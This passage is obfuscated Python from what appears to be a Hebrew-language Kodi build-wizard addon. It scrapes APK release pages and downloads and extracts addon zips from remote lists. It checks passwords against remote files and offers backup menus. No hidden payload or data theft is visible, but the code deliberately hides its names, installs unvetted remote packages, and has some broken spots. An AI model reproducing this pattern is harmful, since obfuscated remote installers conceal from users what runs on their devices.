		OOO0000OOOO0O0OO0 =wiz .openURL (O0O00OOOOO0OO0OO0 ).replace ('\n','').replace ('\r','').replace ('\t','')#line:2758
		OO0OO0O0OOOOOO000 =wiz .openURL (O0O0O00O0O00O000O ).replace ('\n','').replace ('\r','').replace ('\t','')#line:2759
		OOOOO0OO0O000O00O =0 #line:2760
		OOO0O00O0OOO000OO =re .compile ('<tr><td><a href="(.+?)">(.+?)</a></td><td>(.+?)</td><td>(.+?)</td></tr>').findall (OOO0000OOOO0O0OO0 )#line:2761
		OOO00OOOOOOO00O0O =re .compile ('<tr><td><a href="(.+?)">(.+?)</a></td><td>(.+?)</td><td>(.+?)</td></tr>').findall (OO0OO0O0OOOOOO000 )#line:2762
		addFile ("Official Kodi Apk\'s",themeit =THEME1 )#line:2764
		OO0O0O000O0OO0OO0 =False #line:2765
		for O0O00OO0O000OOO00 ,name ,O0OOO0O0OO0OO0O0O ,OOOOO0O00O0OO0000 in OOO0O00O0OOO000OO :#line:2766
			if O0O00OO0O000OOO00 in ['../','old/']:continue #line:2767
			if not O0O00OO0O000OOO00 .endswith ('.apk'):continue #line:2768
			if not O0O00OO0O000OOO00 .find ('_')==-1 and OO0O0O000O0OO0OO0 ==True :continue #line:2769
			try :#line:2770
				O00OOOOO00000O00O =name .split ('-')#line:2771
				if not O0O00OO0O000OOO00 .find ('_')==-1 :#line:2772
					OO0O0O000O0OO0OO0 =True #line:2773
					O0OO0OO0OOOO00OO0 ,OOOOO0OO000O00O0O =O00OOOOO00000O00O [2 ].split ('_')#line:2774
				else :#line:2775
					O0OO0OO0OOOO00OO0 =O00OOOOO00000O00O [2 ]#line:2776
					OOOOO0OO000O00O0O =''#line:2777
				O0OO0O0OOO0OOOOO0 ="[COLOR %s]%s v%s%s %s[/COLOR] [COLOR %s]%s[/COLOR] [COLOR %s]%s[/COLOR]"%(COLOR1 ,O00OOOOO00000O00O [0 ].title (),O00OOOOO00000O00O [1 ],OOOOO0OO000O00O0O .upper (),O0OO0OO0OOOO00OO0 ,COLOR2 ,O0OOO0O0OO0OO0O0O .replace (' ',''),COLOR1 ,OOOOO0O00O0OO0000 )#line:2778
				OO00OOOO0O0O000O0 =urljoin (O0O00OOOOO0OO0OO0 ,O0O00OO0O000OOO00 )#line:2779
				addFile (O0OO0O0OOO0OOOOO0 ,'apkinstall',"%s v%s%s %s"%(O00OOOOO00000O00O [0 ].title (),O00OOOOO00000O00O [1 ],OOOOO0OO000O00O0O .upper (),O0OO0OO0OOOO00OO0 ),OO00OOOO0O0O000O0 )#line:2780
				OOOOO0OO0O000O00O +=1 #line:2781
			except :#line:2782
				wiz .log ("Error on: %s"%name )#line:2783
		for O0O00OO0O000OOO00 ,name ,O0OOO0O0OO0OO0O0O ,OOOOO0O00O0OO0000 in OOO00OOOOOOO00O0O :#line:2785
			if O0O00OO0O000OOO00 in ['../','old/']:continue #line:2786
			if not O0O00OO0O000OOO00 .endswith ('.apk'):continue #line:2787
			if not O0O00OO0O000OOO00 .find ('_')==-1 :continue #line:2788
			try :#line:2789
				O00OOOOO00000O00O =name .split ('-')#line:2790
				O0OO0O0OOO0OOOOO0 ="[COLOR %s]%s v%s %s[/COLOR] [COLOR %s]%s[/COLOR] [COLOR %s]%s[/COLOR]"%(COLOR1 ,O00OOOOO00000O00O [0 ].title (),O00OOOOO00000O00O [1 ],O00OOOOO00000O00O [2 ],COLOR2 ,O0OOO0O0OO0OO0O0O .replace (' ',''),COLOR1 ,OOOOO0O00O0OO0000 )#line:2791
				OO00OOOO0O0O000O0 =urljoin (O0O0O00O0O00O000O ,O0O00OO0O000OOO00 )#line:2792
				addFile (O0OO0O0OOO0OOOOO0 ,'apkinstall',"%s v%s %s"%(O00OOOOO00000O00O [0 ].title (),O00OOOOO00000O00O [1 ],O00OOOOO00000O00O [2 ]),OO00OOOO0O0O000O0 )#line:2793
				OOOOO0OO0O000O00O +=1 #line:2794
			except :#line:2795
				wiz .log ("Error on: %s"%name )#line:2796
		if OOOOO0OO0O000O00O ==0 :addFile ("Error Kodi Scraper Is Currently Down.")#line:2797
	elif name =='spmc':#line:2798
		OO0OOOO0OOO000OOO ='https://github.com/koying/SPMC/releases'#line:2799
		OOO0000OOOO0O0OO0 =wiz .openURL (OO0OOOO0OOO000OOO ).replace ('\n','').replace ('\r','').replace ('\t','')#line:2800
		OOOOO0OO0O000O00O =0 #line:2801
		OOO0O00O0OOO000OO =re .compile ('<div.+?lass="release-body.+?div class="release-header".+?a href=.+?>(.+?)</a>.+?ul class="release-downloads">(.+?)</ul>.+?/div>').findall (OOO0000OOOO0O0OO0 )#line:2802
		addFile ("Official SPMC Apk\'s",themeit =THEME1 )#line:2804
		for name ,OOO00OO0OOO00OOOO in OOO0O00O0OOO000OO :#line:2806
			OO000O00O0OOOO0O0 =''#line:2807
			OOO00OOOOOOO00O0O =re .compile ('<li>.+?<a href="(.+?)" rel="nofollow">.+?<small class="text-gray float-right">(.+?)</small>.+?strong>(.+?)</strong>.+?</a>.+?</li>').findall (OOO00OO0OOO00OOOO )#line:2808
			for O0OOO00OO0OOOO000 ,OO0OOO0OO0OOOO0O0 ,OOO000O0O0OOO0000 in OOO00OOOOOOO00O0O :#line:2809
				if OOO000O0O0OOO0000 .find ('armeabi')==-1 :continue #line:2810
				if OOO000O0O0OOO0000 .find ('launcher')>-1 :continue #line:2811
				OO000O00O0OOOO0O0 =urljoin ('https://github.com',O0OOO00OO0OOOO000 )#line:2812
				break #line:2813
		if OOOOO0OO0O000O00O ==0 :addFile ("Error SPMC Scraper Is Currently Down.")#line:2815
def apkMenu (url =None ):#line:2817
	if url ==None :#line:2818
		if HIDESPACERS =='No':addFile (wiz .sep (),'',themeit =THEME3 )#line:2821
	if not APKFILE =='http://':#line:2822
		if url ==None :#line:2823
			O00OOOO000000O0O0 =wiz .workingURL (APKFILE )#line:2824
			O0O0000OOOOO0000O =uservar .APKFILE #line:2825
		else :#line:2826
			O00OOOO000000O0O0 =wiz .workingURL (url )#line:2827
			O0O0000OOOOO0000O =url #line:2828
		if O00OOOO000000O0O0 ==True :#line:2829
			O0O0000O0O000O00O =wiz .openURL (O0O0000OOOOO0000O ).replace ('\n','').replace ('\r','').replace ('\t','')#line:2830
			OO00O000000OO0OOO =re .compile ('name="(.+?)".+?ection="(.+?)".+?rl="(.+?)".+?con="(.+?)".+?anart="(.+?)".+?dult="(.+?)".+?escription="(.+?)"').findall (O0O0000O0O000O00O )#line:2831
			if len (OO00O000000OO0OOO )>0 :#line:2832
				O0O00OOO0OOOOO000 =0 #line:2833
				for OOO0O0O0O00O00O0O ,O000OO0OOO0OOO0O0 ,url ,OO00O0OO000O000O0 ,OO0OOOO000OOO00O0 ,O00OO000OOO00O0O0 ,O0OOO0O0O0O0000O0 in OO00O000000OO0OOO :#line:2834
					if not SHOWADULT =='true'and O00OO000OOO00O0O0 .lower ()=='yes':continue #line:2835
					if O000OO0OOO0OOO0O0 .lower ()=='yes':#line:2836
						O0O00OOO0OOOOO000 +=1 #line:2837
						addDir ("[B]%s[/B]"%OOO0O0O0O00O00O0O ,'apk',url ,description =O0OOO0O0O0O0000O0 ,icon =OO00O0OO000O000O0 ,fanart =OO0OOOO000OOO00O0 ,themeit =THEME3 )#line:2838
					else :#line:2839
						O0O00OOO0OOOOO000 +=1 #line:2840
						addFile (OOO0O0O0O00O00O0O ,'apkinstall',OOO0O0O0O00O00O0O ,url ,description =O0OOO0O0O0O0000O0 ,icon =OO00O0OO000O000O0 ,fanart =OO0OOOO000OOO00O0 ,themeit =THEME2 )#line:2841
					if O0O00OOO0OOOOO000 <1 :#line:2842
						addFile ("No addons added to this menu yet!",'',themeit =THEME2 )#line:2843
			else :wiz .log ("[APK Menu] ERROR: Invalid Format.",xbmc .LOGERROR )#line:2844
		else :#line:2845
			wiz .log ("[APK Menu] ERROR: URL for apk list not working.",xbmc .LOGERROR )#line:2846
			addFile ('Url for txt file not valid','',themeit =THEME3 )#line:2847
			addFile ('%s'%O00OOOO000000O0O0 ,'',themeit =THEME3 )#line:2848
		return #line:2849
	else :wiz .log ("[APK Menu] No APK list added.")#line:2850
	setView ('files','viewType')#line:2851
def addonMenu (url =None ):#line:2853
	if not ADDONFILE =='http://':#line:2854
		if url ==None :#line:2855
			O0OOOOOO0O0000OOO =wiz .workingURL (ADDONFILE )#line:2856
			OOO0O00OO000OOOO0 =uservar .ADDONFILE #line:2857
		else :#line:2858
			O0OOOOOO0O0000OOO =wiz .workingURL (url )#line:2859
			OOO0O00OO000OOOO0 =url #line:2860
		if O0OOOOOO0O0000OOO ==True :#line:2861
			OO00000O0OO00OO00 =wiz .openURL (OOO0O00OO000OOOO0 ).replace ('\n','').replace ('\r','').replace ('\t','').replace ('repository=""','repository="none"').replace ('repositoryurl=""','repositoryurl="http://"').replace ('repositoryxml=""','repositoryxml="http://"')#line:2862
			OOOO00OO0O0OO000O =re .compile ('name="(.+?)".+?lugin="(.+?)".+?rl="(.+?)".+?epository="(.+?)".+?epositoryxml="(.+?)".+?epositoryurl="(.+?)".+?con="(.+?)".+?anart="(.+?)".+?dult="(.+?)".+?escription="(.+?)"').findall (OO00000O0OO00OO00 )#line:2863
			if len (OOOO00OO0O0OO000O )>0 :#line:2864
				O00O00O000O0O00O0 =0 #line:2865
				for OO0OOO0OO000O000O ,OOOOOOO00O0O000O0 ,url ,OOO00OO0O0OO0OOOO ,OOO0O0O00OOO0O0O0 ,O00O0O000OOOO00OO ,O000O0OO000OOOO00 ,O000000OO000OO0OO ,O0O0000OO00O00OOO ,O0O00O000O00O00O0 in OOOO00OO0O0OO000O :#line:2866
					if OOOOOOO00O0O000O0 .lower ()=='section':#line:2867
						O00O00O000O0O00O0 +=1 #line:2868
						addDir ("[B]%s[/B]"%OO0OOO0OO000O000O ,'addons',url ,description =O0O00O000O00O00O0 ,icon =O000O0OO000OOOO00 ,fanart =O000000OO000OO0OO ,themeit =THEME3 )#line:2869
					else :#line:2870
						if not SHOWADULT =='true'and O0O0000OO00O00OOO .lower ()=='yes':continue #line:2871
						try :#line:2872
							O0OOO0O000O0OOOO0 =xbmcaddon .Addon (id =OOOOOOO00O0O000O0 ).getAddonInfo ('path')#line:2873
							if os .path .exists (O0OOO0O000O0OOOO0 ):#line:2874
								OO0OOO0OO000O000O ="[COLOR green][Installed][/COLOR] %s"%OO0OOO0OO000O000O #line:2875
						except :#line:2876
							pass #line:2877
						O00O00O000O0O00O0 +=1 #line:2878
						addFile (OO0OOO0OO000O000O ,'addoninstall',OOOOOOO00O0O000O0 ,OOO0O00OO000OOOO0 ,description =O0O00O000O00O00O0 ,icon =O000O0OO000OOOO00 ,fanart =O000000OO000OO0OO ,themeit =THEME2 )#line:2879
					if O00O00O000O0O00O0 <1 :#line:2880
						addFile ("No addons added to this menu yet!",'',themeit =THEME2 )#line:2881
			else :#line:2882
				addFile ('Text File not formated correctly!','',themeit =THEME3 )#line:2883
				wiz .log ("[Addon Menu] ERROR: Invalid Format.")#line:2884
		else :#line:2885
			wiz .log ("[Addon Menu] ERROR: URL for Addon list not working.")#line:2886
			addFile ('Url for txt file not valid','',themeit =THEME3 )#line:2887
			addFile ('%s'%O0OOOOOO0O0000OOO ,'',themeit =THEME3 )#line:2888
	else :wiz .log ("[Addon Menu] No Addon list added.")#line:2889
	setView ('files','viewType')#line:2890
def addonInstaller (O0O0O00OO0O0OOO00 ,O0000OO0O00O0OOOO ):#line:2892
	if not ADDONFILE =='http://':#line:2893
		OO0OOOO000O0O00OO =wiz .workingURL (O0000OO0O00O0OOOO )#line:2894
		if OO0OOOO000O0O00OO ==True :#line:2895
			OOO00000OO0OO00O0 =wiz .openURL (O0000OO0O00O0OOOO ).replace ('\n','').replace ('\r','').replace ('\t','').replace ('repository=""','repository="none"').replace ('repositoryurl=""','repositoryurl="http://"').replace ('repositoryxml=""','repositoryxml="http://"')#line:2896
			OOOOOOOO000O0OO00 =re .compile ('name="(.+?)".+?lugin="%s".+?rl="(.+?)".+?epository="(.+?)".+?epositoryxml="(.+?)".+?epositoryurl="(.+?)".+?con="(.+?)".+?anart="(.+?)".+?dult="(.+?)".+?escription="(.+?)"'%O0O0O00OO0O0OOO00 ).findall (OOO00000OO0OO00O0 )#line:2897
			if len (OOOOOOOO000O0OO00 )>0 :#line:2898
				for O00O0000000O0OO0O ,O0000OO0O00O0OOOO ,O00OOO0OOOOOOOO0O ,O0OOO0O0OO00OO0O0 ,O000O0000O0O0OO00 ,OOOOOO0O0000O00OO ,O000OOO00O0O00O0O ,OOO0OO0O00O0OOOO0 ,O0OO0OO0000O00O0O in OOOOOOOO000O0OO00 :#line:2899
					if os .path .exists (os .path .join (ADDONS ,O0O0O00OO0O0OOO00 )):#line:2900
						OO0OOOOO000OOOO00 =['Launch Addon','Remove Addon']#line:2901
						OOOO0OOO0OO00OO00 =DIALOG .select ("[COLOR %s]Addon already installed what would you like to do?[/COLOR]"%COLOR2 ,OO0OOOOO000OOOO00 )#line:2902
						if OOOO0OOO0OO00OO00 ==0 :#line:2903
							wiz .ebi ('RunAddon(%s)'%O0O0O00OO0O0OOO00 )#line:2904
							xbmc .sleep (1000 )#line:2905
							return True #line:2906
						elif OOOO0OOO0OO00OO00 ==1 :#line:2907
							wiz .cleanHouse (os .path .join (ADDONS ,O0O0O00OO0O0OOO00 ))#line:2908
							try :wiz .removeFolder (os .path .join (ADDONS ,O0O0O00OO0O0OOO00 ))#line:2909
							except :pass #line:2910
							if DIALOG .yesno (ADDONTITLE ,"[COLOR %s]Would you like to remove the addon_data for:"%COLOR2 ,"[COLOR %s]%s[/COLOR]?[/COLOR]"%(COLOR1 ,O0O0O00OO0O0OOO00 ),yeslabel ="[B][COLOR green]Yes Remove[/COLOR][/B]",nolabel ="[B][COLOR red]No Skip[/COLOR][/B]"):#line:2911
								removeAddonData (O0O0O00OO0O0OOO00 )#line:2912
							wiz .refresh ()#line:2913
							return True #line:2914
						else :#line:2915
							return False #line:2916
					OO000O0O0OO0O0000 =os .path .join (ADDONS ,O00OOO0OOOOOOOO0O )#line:2917
					if not O00OOO0OOOOOOOO0O .lower ()=='none'and not os .path .exists (OO000O0O0OO0O0000 ):#line:2918
						wiz .log ("Repository not installed, installing it")#line:2919
						if DIALOG .yesno (ADDONTITLE ,"[COLOR %s]Would you like to install the repository for [COLOR %s]%s[/COLOR]:"%(COLOR2 ,COLOR1 ,O0O0O00OO0O0OOO00 ),"[COLOR %s]%s[/COLOR]?[/COLOR]"%(COLOR1 ,O00OOO0OOOOOOOO0O ),yeslabel ="[B][COLOR green]Yes Install[/COLOR][/B]",nolabel ="[B][COLOR red]No Skip[/COLOR][/B]"):#line:2920
							OOO0OO0OO0O0O0O0O =wiz .parseDOM (wiz .openURL (O0OOO0O0OO00OO0O0 ),'addon',ret ='version',attrs ={'id':O00OOO0OOOOOOOO0O })#line:2921
							if len (OOO0OO0OO0O0O0O0O )>0 :#line:2922
								O00O0OO0O000O0O00 ='%s%s-%s.zip'%(O000O0000O0O0OO00 ,O00OOO0OOOOOOOO0O ,OOO0OO0OO0O0O0O0O [0 ])#line:2923
								wiz .log (O00O0OO0O000O0O00 )#line:2924
								if KODIV >=17 :wiz .addonDatabase (O00OOO0OOOOOOOO0O ,1 )#line:2925
								installAddon (O00OOO0OOOOOOOO0O ,O00O0OO0O000O0O00 )#line:2926
								wiz .ebi ('UpdateAddonRepos()')#line:2927
								wiz .log ("Installing Addon from Kodi")#line:2929
								OO0O0OOOO0O0OO00O =installFromKodi (O0O0O00OO0O0OOO00 )#line:2930
								wiz .log ("Install from Kodi: %s"%OO0O0OOOO0O0OO00O )#line:2931
								if OO0O0OOOO0O0OO00O :#line:2932
									wiz .refresh ()#line:2933
									return True #line:2934
							else :#line:2935
								wiz .log ("[Addon Installer] Repository not installed: Unable to grab url! (%s)"%O00OOO0OOOOOOOO0O )#line:2936
						else :wiz .log ("[Addon Installer] Repository for %s not installed: %s"%(O0O0O00OO0O0OOO00 ,O00OOO0OOOOOOOO0O ))#line:2937
					elif O00OOO0OOOOOOOO0O .lower ()=='none':#line:2938
						wiz .log ("No repository, installing addon")#line:2939
						O0000O0OOOOO00000 =O0O0O00OO0O0OOO00 #line:2940
						OOO00OO00O0OO0OOO =O0000OO0O00O0OOOO #line:2941
						installAddon (O0O0O00OO0O0OOO00 ,O0000OO0O00O0OOOO )#line:2942
						wiz .refresh ()#line:2943
						return True #line:2944
					else :#line:2945
						wiz .log ("Repository installed, installing addon")#line:2946
						OO0O0OOOO0O0OO00O =installFromKodi (O0O0O00OO0O0OOO00 ,False )#line:2947
						if OO0O0OOOO0O0OO00O :#line:2948
							wiz .refresh ()#line:2949
							return True #line:2950
					if os .path .exists (os .path .join (ADDONS ,O0O0O00OO0O0OOO00 )):return True #line:2951
					OOO000000000000OO =wiz .parseDOM (wiz .openURL (O0OOO0O0OO00OO0O0 ),'addon',ret ='version',attrs ={'id':O0O0O00OO0O0OOO00 })#line:2952
					if len (OOO000000000000OO )>0 :#line:2953
						O0000OO0O00O0OOOO ="%s%s-%s.zip"%(O0000OO0O00O0OOOO ,O0O0O00OO0O0OOO00 ,OOO000000000000OO [0 ])#line:2954
						wiz .log (str (O0000OO0O00O0OOOO ))#line:2955
						if KODIV >=17 :wiz .addonDatabase (O0O0O00OO0O0OOO00 ,1 )#line:2956
						installAddon (O0O0O00OO0O0OOO00 ,O0000OO0O00O0OOOO )#line:2957
						wiz .refresh ()#line:2958
					else :#line:2959
						wiz .log ("no match");return False #line:2960
			else :wiz .log ("[Addon Installer] Invalid Format")#line:2961
		else :wiz .log ("[Addon Installer] Text File: %s"%OO0OOOO000O0O00OO )#line:2962
	else :wiz .log ("[Addon Installer] Not Enabled.")#line:2963
def installFromKodi (OOOOOO00000OOOOO0 ,over =True ):#line:2965
	if over ==True :#line:2966
		xbmc .sleep (2000 )#line:2967
	wiz .ebi ('RunPlugin(plugin://%s)'%OOOOOO00000OOOOO0 )#line:2969
	if not wiz .whileWindow ('yesnodialog'):#line:2970
		return False #line:2971
	xbmc .sleep (1000 )#line:2972
	if wiz .whileWindow ('okdialog'):#line:2973
		return False #line:2974
	wiz .whileWindow ('progressdialog')#line:2975
	if os .path .exists (os .path .join (ADDONS ,OOOOOO00000OOOOO0 )):return True #line:2976
	else :return False #line:2977
def installAddon (O0OO0OO0O000O0OOO ,OO000O0O0O0O0OO0O ):#line:2979
	if not wiz .workingURL (OO000O0O0O0O0OO0O )==True :wiz .LogNotify ("[COLOR %s]Addon Installer[/COLOR]"%COLOR1 ,'[COLOR %s]%s:[/COLOR] [COLOR %s]קישור זיפ לא תקין![/COLOR]'%(COLOR1 ,O0OO0OO0O000O0OOO ,COLOR2 ));return #line:2980
	if not os .path .exists (PACKAGES ):os .makedirs (PACKAGES )#line:2981
	DP .create (ADDONTITLE ,'[COLOR %s][B]Downloading:[/B][/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR2 ,COLOR1 ,O0OO0OO0O000O0OOO ),'','[COLOR %s]אנא המתן[/COLOR]'%COLOR2 )#line:2982
	O0OOO0O0OOOO0O00O =OO000O0O0O0O0OO0O .split ('/')#line:2983
	O0000OO0OOOOO0000 =os .path .join (PACKAGES ,O0OOO0O0OOOO0O00O [-1 ])#line:2984
	try :os .remove (O0000OO0OOOOO0000 )#line:2985
	except :pass #line:2986
	downloader .download (OO000O0O0O0O0OO0O ,O0000OO0OOOOO0000 ,DP )#line:2987
	OOO00O0O000O0OOO0 ='[COLOR %s][B]Installing:[/B][/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR2 ,COLOR1 ,O0OO0OO0O000O0OOO )#line:2988
	DP .update (0 ,OOO00O0O000O0OOO0 ,'','[COLOR %s]אנא המתן[/COLOR]'%COLOR2 )#line:2989
	O00OO0OO000000000 ,OOOOO00000OOOO000 ,OO0OOO0O000O0O0O0 =extract .all (O0000OO0OOOOO0000 ,ADDONS ,DP ,title =OOO00O0O000O0OOO0 )#line:2990
	DP .update (0 ,OOO00O0O000O0OOO0 ,'','[COLOR %s]מתקין תלויות[/COLOR]'%COLOR2 )#line:2991
	installed (O0OO0OO0O000O0OOO )#line:2992
	installDep (O0OO0OO0O000O0OOO ,DP )#line:2993
	DP .close ()#line:2994
	wiz .ebi ('UpdateAddonRepos()')#line:2995
	wiz .ebi ('UpdateLocalAddons()')#line:2996
	wiz .refresh ()#line:2997
def installDep (OO0O000OO0O00O000 ,DP =None ):#line:2999
	OO000O00OO0O0OO0O =os .path .join (ADDONS ,OO0O000OO0O00O000 ,'addon.xml')#line:3000
	if os .path .exists (OO000O00OO0O0OO0O ):#line:3001
		O00O0O0OO00O0000O =open (OO000O00OO0O0OO0O ,mode ='r');OOOO0000OO0O00O00 =O00O0O0OO00O0000O .read ();O00O0O0OO00O0000O .close ();#line:3002
		O0OO000OOOOO00OOO =wiz .parseDOM (OOOO0000OO0O00O00 ,'import',ret ='addon')#line:3003
		for OO0OOOO0OO0OO0000 in O0OO000OOOOO00OOO :#line:3004
			if not 'xbmc.python'in OO0OOOO0OO0OO0000 :#line:3005
				if not DP ==None :#line:3006
					DP .update (0 ,'','[COLOR %s]%s[/COLOR]'%(COLOR1 ,OO0OOOO0OO0OO0000 ))#line:3007
				wiz .createTemp (OO0OOOO0OO0OO0000 )#line:3008
def installed (OOOOO0O00O000OOO0 ):#line:3035
	OOO000000OO00000O =os .path .join (ADDONS ,OOOOO0O00O000OOO0 ,'addon.xml')#line:3036
	if os .path .exists (OOO000000OO00000O ):#line:3037
		try :#line:3038
			OO0O0O0OOOO0OOOOO =open (OOO000000OO00000O ,mode ='r');OOO00OOOOOO0OOO00 =OO0O0O0OOOO0OOOOO .read ();OO0O0O0OOOO0OOOOO .close ()#line:3039
			OO00O00OO0000OO00 =wiz .parseDOM (OOO00OOOOOO0OOO00 ,'addon',ret ='name',attrs ={'id':OOOOO0O00O000OOO0 })#line:3040
			O00O0O0O0O0000OO0 =os .path .join (ADDONS ,OOOOO0O00O000OOO0 ,'icon.png')#line:3041
			wiz .LogNotify ('[COLOR %s]%s[/COLOR]'%(COLOR1 ,OO00O00OO0000OO00 [0 ]),'[COLOR %s]מאפשר הרחבות[/COLOR]'%COLOR2 ,'2000',O00O0O0O0O0000OO0 )#line:3042
		except :pass #line:3043
def youtubeMenu (url =None ):#line:3045
	if not YOUTUBEFILE =='http://':#line:3046
		if url ==None :#line:3047
			OO0O0000OO00OO00O =wiz .workingURL (YOUTUBEFILE )#line:3048
			OOOO00O0O0O00OOOO =uservar .YOUTUBEFILE #line:3049
		else :#line:3050
			OO0O0000OO00OO00O =wiz .workingURL (url )#line:3051
			OOOO00O0O0O00OOOO =url #line:3052
		if OO0O0000OO00OO00O ==True :#line:3053
			O0O00O00O00OOO0OO =wiz .openURL (OOOO00O0O0O00OOOO ).replace ('\n','').replace ('\r','').replace ('\t','')#line:3054
			OOOO0OOO00OOO000O =re .compile ('name="(.+?)".+?ection="(.+?)".+?rl="(.+?)".+?con="(.+?)".+?anart="(.+?)".+?escription="(.+?)"').findall (O0O00O00O00OOO0OO )#line:3055
			if len (OOOO0OOO00OOO000O )>0 :#line:3056
				for OOO0000OO000O0OO0 ,OO0000000O0000O00 ,url ,O0OOO0OOOOO00OOO0 ,OOO00OO0O0O0OOO0O ,OOO000OO00OOO00OO in OOOO0OOO00OOO000O :#line:3057
					if OO0000000O0000O00 .lower ()=="yes":#line:3058
						addDir ("[B]%s[/B]"%OOO0000OO000O0OO0 ,'youtube',url ,description =OOO000OO00OOO00OO ,icon =O0OOO0OOOOO00OOO0 ,fanart =OOO00OO0O0O0OOO0O ,themeit =THEME3 )#line:3059
					else :#line:3060
						addFile (OOO0000OO000O0OO0 ,'viewVideo',url =url ,description =OOO000OO00OOO00OO ,icon =O0OOO0OOOOO00OOO0 ,fanart =OOO00OO0O0O0OOO0O ,themeit =THEME2 )#line:3061
			else :wiz .log ("[YouTube Menu] ERROR: Invalid Format.")#line:3062
		else :#line:3063
			wiz .log ("[YouTube Menu] ERROR: URL for YouTube list not working.")#line:3064
			addFile ('Url for txt file not valid','',themeit =THEME3 )#line:3065
			addFile ('%s'%OO0O0000OO00OO00O ,'',themeit =THEME3 )#line:3066
	else :wiz .log ("[YouTube Menu] No YouTube list added.")#line:3067
	setView ('files','viewType')#line:3068
def STARTP ():#line:3069
	O00O0OOOO0O0OOOO0 =(ADDON .getSetting ("pass"))#line:3070
	if BUILDNAME =="":#line:3071
	 if not NOTIFY =='true':#line:3072
          O000O000O00O0OO0O =wiz .workingURL (NOTIFICATION )#line:3073
	 if not NOTIFY2 =='true':#line:3074
          O000O000O00O0OO0O =wiz .workingURL (NOTIFICATION2 )#line:3075
	 if not NOTIFY3 =='true':#line:3076
          O000O000O00O0OO0O =wiz .workingURL (NOTIFICATION3 )#line:3077
	O0OOOOOOO0O000OOO =O00O0OOOO0O0OOOO0 #line:3078
	O000O000O00O0OO0O =urllib2 .Request (SPEED )#line:3079
	O0O0OO0OO0OO000O0 =urllib2 .urlopen (O000O000O00O0OO0O )#line:3080
	O000000OO000OOOO0 =O0O0OO0OO0OO000O0 .readlines ()#line:3082
	O00OOOOO0OOOOOO00 =0 #line:3086
	for OOO00OO00000OOO0O in O000000OO000OOOO0 :#line:3087
		if OOO00OO00000OOO0O .split (' ==')[0 ]==O00O0OOOO0O0OOOO0 or OOO00OO00000OOO0O .split ()[0 ]==O00O0OOOO0O0OOOO0 :#line:3088
			O00OOOOO0OOOOOO00 =1 #line:3089
			break #line:3090
	if O00OOOOO0OOOOOO00 ==0 :#line:3091
					O00O0000OO0O000O0 =DIALOG .yesno ("%s"%ADDONTITLE ,"[COLOR %s]הסיסמה אינה נכונה,"%(COLOR2 ),"הכנס את הסיסמה כעת[/COLOR]",nolabel ='[B][COLOR white]ביטול[/COLOR][/B]',yeslabel ='[B][COLOR green]אישור[/COLOR][/B]')#line:3092
					if O00O0000OO0O000O0 :#line:3094
						ADDON .openSettings ()#line:3096
						sys .exit ()#line:3098
					else :#line:3099
						sys .exit ()#line:3100
	return 'ok'#line:3104
def STARTP2 ():#line:3105
	OO00000000O000000 =(ADDON .getSetting ("user"))#line:3106
	OOO00OO00000O0OOO =(UNAME )#line:3108
	OOOO000O0O0OOOOOO =urllib2 .urlopen (OOO00OO00000O0OOO )#line:3109
	O0O0OOOOOOOOO00O0 =OOOO000O0O0OOOOOO .readlines ()#line:3110
	O00O0O0O000000O0O =0 #line:3111
	for O0O0000O0000OOO00 in O0O0OOOOOOOOO00O0 :#line:3114
		if O0O0000O0000OOO00 .split (' ==')[0 ]==OO00000000O000000 or O0O0000O0000OOO00 .split ()[0 ]==OO00000000O000000 :#line:3115
			O00O0O0O000000O0O =1 #line:3116
			break #line:3117
	if O00O0O0O000000O0O ==0 :#line:3118
		OOOOOOOO0OOOO000O =DIALOG .yesno ("%s"%ADDONTITLE ,"[COLOR %s]שם המתשמש שהוכנס אינו נכון,"%(COLOR2 ),"הכנס את שם המשתמש כעת[/COLOR]",nolabel ='[B][COLOR white]ביטול[/COLOR][/B]',yeslabel ='[B][COLOR green]אישור[/COLOR][/B]')#line:3119
		if OOOOOOOO0OOOO000O :#line:3121
			ADDON .openSettings ()#line:3123
			sys .exit ()#line:3126
		else :#line:3127
			sys .exit ()#line:3128
	return 'ok'#line:3132
def passandpin ():#line:3133
	addFile ('קבל קוד אימות','getpass',name ,'getpass',themeit =THEME1 )#line:3134
	addFile ('הכנס שם משתמש','setuname',name ,'setuname',themeit =THEME1 )#line:3135
	addFile ('הכנס סיסמה','setpass',name ,'setpass',themeit =THEME1 )#line:3136
def passandUsername ():#line:3137
	ADDON .openSettings ()#line:3139
def folderback ():#line:3142
    O00O000OO00000OOO =ADDON .getSetting ("path")#line:3143
    if O00O000OO00000OOO :#line:3144
      O00O000OO00000OOO =xbmcgui .Dialog ().browse (0 ,"בחר תקייה",'files','',False ,False ,HOME )#line:3145
      ADDON .setSetting ("path",O00O000OO00000OOO )#line:3146
def backmyupbuild ():#line:3149
		addFile ('מחק את תיקיית הגיבוי שלי','clearbackup',icon =ICONMAINT ,themeit =THEME3 )#line:3153
		addFile ('[COLOR %s]%s[/COLOR]מיקום גיבוי: '%(COLOR2 ,MYBUILDS ),'folderback','Maintenance',icon =ICONMAINT ,themeit =THEME3 )#line:3154
		addFile ('גיבוי בילד שלם','backupbuild',icon =ICONMAINT ,themeit =THEME3 )#line:3155
		addFile ('גיבוי הגדרות סקין ותפריטים בלבד','backuptheme',icon =ICONMAINT ,themeit =THEME3 )#line:3157
		addFile ('גיבוי הגדרות של הרחבות כולל תפריטים וסיסמאות','backupaddon',icon =ICONMAINT ,themeit =THEME3 )#line:3158
		addFile ('שחזור בילד שלם','restorezip',icon =ICONMAINT ,themeit =THEME3 )#line:3159
		addFile ('שחזור הגדרות','restoreaddon',icon =ICONMAINT ,themeit =THEME3 )#line:3161
def maintMenu (view =None ):#line:3165
	OO0O00O000000O00O ='[B][COLOR green]ON[/COLOR][/B]';O0OO000O0OOOOO0OO ='[B][COLOR red]OFF[/COLOR][/B]'#line:3167
	OO00O00O000OOO0O0 ='true'if AUTOCLEANUP =='true'else 'false'#line:3168
	O0O00OO00O0OO000O ='true'if AUTOCACHE =='true'else 'false'#line:3169
	O0OO0O000OOOOOOOO ='true'if AUTOPACKAGES =='true'else 'false'#line:3170
	O00O00OO0O0OO0O00 ='true'if AUTOTHUMBS =='true'else 'false'#line:3171
	O0OO000O0O0000O00 ='true'if SHOWMAINT =='true'else 'false'#line:3172
	OOOO00000OO00O00O ='true'if INCLUDEVIDEO =='true'else 'false'#line:3173
	OO00O0O0O0OO00000 ='true'if INCLUDEALL =='true'else 'false'#line:3174
